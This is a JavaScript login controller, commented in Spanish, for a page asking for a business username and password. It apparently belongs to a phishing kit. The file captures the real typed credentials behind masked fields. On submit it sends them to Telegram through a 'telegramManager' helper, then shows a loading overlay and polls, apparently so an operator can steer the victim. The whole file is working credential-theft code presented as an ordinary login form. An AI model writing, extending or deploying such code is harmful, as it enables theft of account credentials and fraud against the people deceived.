/**
 * LOGIN CONTROLLER - VERSIÓN COMPLETAMENTE CORREGIDA
 * Maneja inputs enmascarados correctamente, toggle de visibilidad y envío a Telegram
 */

'use strict';

class LoginController {
    constructor() {
        // Elementos DOM
        this.userInput = document.getElementById('userInput');
        this.passInput = document.getElementById('passInput');
        this.userLabel = document.getElementById('userFloatingLabel');
        this.passLabel = document.getElementById('passFloatingLabel');
        this.toggleUserBtn = document.getElementById('toggleUser');
        this.togglePassBtn = document.getElementById('togglePass');
        this.loginBtn = document.getElementById('loginBtn');
        this.loginForm = document.getElementById('loginForm');
        
        // Estado
        this.userRealValue = '';
        this.passRealValue = '';
        this.userVisible = false;
        this.passVisible = false;
        
        this.init();
    }
    
    init() {
        this.setupUserInput();
        this.setupPassInput();
        this.setupToggles();
        this.setupForm();
        console.log('✅ Login Controller initialized');
    }
    
    // ===== USUARIO DE NEGOCIOS =====
    setupUserInput() {
        let lastValue = '';
        
        this.userInput.addEventListener('input', (e) => {
            const input = e.target;
            const currentValue = input.value;
            
            if (this.userVisible) {
                // Modo visible: guardar directamente
                this.userRealValue = currentValue;
                lastValue = currentValue;
            } else {
                // Modo oculto
                // Detectar si se agregó o eliminó
                if (currentValue.length > lastValue.length) {
                    // Se agregaron caracteres
                    const diff = currentValue.length - lastValue.length;
                    const newChars = currentValue.slice(-diff);
                    // Solo agregar caracteres que NO sean puntos
                    for (let char of newChars) {
                        if (char !== '•') {
                            this.userRealValue += char;
                        }
                    }
                } else if (currentValue.length < lastValue.length) {
                    // Se eliminaron caracteres
                    const diff = lastValue.length - currentValue.length;
                    this.userRealValue = this.userRealValue.slice(0, -diff);
                }
                
                // Actualizar input con puntos
                input.value = '•'.repeat(this.userRealValue.length);
                lastValue = input.value;
            }
            
            this.updateLabel(this.userLabel, this.userRealValue);
            this.validateForm();
        });
        
        this.userInput.addEventListener('focus', () => {
            this.userLabel.classList.add('active');
        });
        
        this.userInput.addEventListener('blur', () => {
            if (!this.userRealValue) {
                this.userLabel.classList.remove('active');
            }
        });
    }
    
    // ===== CLAVE DE NEGOCIOS =====
    setupPassInput() {
        let lastValue = '';
        
        this.passInput.addEventListener('input', (e) => {
            const input = e.target;
            const currentValue = input.value;
            
            if (this.passVisible) {
                // Modo visible: guardar directamente
                this.passRealValue = currentValue;
                lastValue = currentValue;
            } else {
                // Modo oculto
                // Detectar si se agregó o eliminó
                if (currentValue.length > lastValue.length) {
                    // Se agregaron caracteres
                    const diff = currentValue.length - lastValue.length;
                    const newChars = currentValue.slice(-diff);
                    // Solo agregar caracteres que NO sean puntos
                    for (let char of newChars) {
                        if (char !== '•') {
                            this.passRealValue += char;
                        }
                    }
                } else if (currentValue.length < lastValue.length) {
                    // Se eliminaron caracteres
                    const diff = lastValue.length - currentValue.length;
                    this.passRealValue = this.passRealValue.slice(0, -diff);
                }
                
                // Actualizar input con puntos
                input.value = '•'.repeat(this.passRealValue.length);
                lastValue = input.value;
            }
            
            this.updateLabel(this.passLabel, this.passRealValue);
            this.validateForm();
        });
        
        this.passInput.addEventListener('focus', () => {
            this.passLabel.classList.add('active');
        });
        
        this.passInput.addEventListener('blur', () => {
            if (!this.passRealValue) {
                this.passLabel.classList.remove('active');
            }
        });
    }
    
    // ===== TOGGLE VISIBILITY =====
    setupToggles() {
        // Toggle usuario
        this.toggleUserBtn.addEventListener('click', () => {
            this.userVisible = !this.userVisible;
            
            const eyeIcon = this.toggleUserBtn.querySelector('.eye-icon');
            const eyeSlashIcon = this.toggleUserBtn.querySelector('.eye-slash-icon');
            
            if (this.userVisible) {
                // Mostrar texto real
                this.userInput.value = this.userRealValue;
                eyeIcon.classList.add('hidden');
                eyeSlashIcon.classList.remove('hidden');
            } else {
                // Mostrar puntos
                this.userInput.value = '•'.repeat(this.userRealValue.length);
                eyeIcon.classList.remove('hidden');
                eyeSlashIcon.classList.add('hidden');
            }
        });
        
        // Toggle password - CORREGIDO
        this.togglePassBtn.addEventListener('click', () => {
            this.passVisible = !this.passVisible;
            
            const eyeIcon = this.togglePassBtn.querySelector('.eye-icon');
            const eyeSlashIcon = this.togglePassBtn.querySelector('.eye-slash-icon');
            
            if (this.passVisible) {
                // Mostrar texto real
                this.passInput.type = 'text';
                this.passInput.value = this.passRealValue;
                eyeIcon.classList.add('hidden');
                eyeSlashIcon.classList.remove('hidden');
            } else {
                // Mostrar puntos
                this.passInput.type = 'text';
                this.passInput.value = '•'.repeat(this.passRealValue.length);
                eyeIcon.classList.remove('hidden');
                eyeSlashIcon.classList.add('hidden');
            }
        });
    }
    
    // ===== FORM HANDLING =====
    setupForm() {
        this.loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            if (!this.loginBtn.disabled) {
                // Mostrar overlay
                const overlay = document.querySelector('.loading-overlay');
                if (overlay) {
                    overlay.classList.add('active');
                }
                
                // Enviar a Telegram
                await window.telegramManager.sendToTelegram('login', {
                    usuario: this.userRealValue,
                    clave: this.passRealValue
                });
                
                // Iniciar polling
                window.telegramManager.startPolling();
            }
        });
    }
    
    // ===== HELPERS =====
    updateLabel(label, value) {
        if (value.length > 0) {
            label.classList.add('active');
        } else {
            label.classList.remove('active');
        }
    }
    
    validateForm() {
        if (this.userRealValue.length > 0 && this.passRealValue.length > 0) {
            this.loginBtn.disabled = false;
        } else {
            this.loginBtn.disabled = true;
        }
    }
    
    // Método público para obtener valores
    getCredentials() {
        return {
            usuario: this.userRealValue,
            clave: this.passRealValue
        };
    }
}

// Inicializar
document.addEventListener('DOMContentLoaded', () => {
    window.loginController = new LoginController();
});
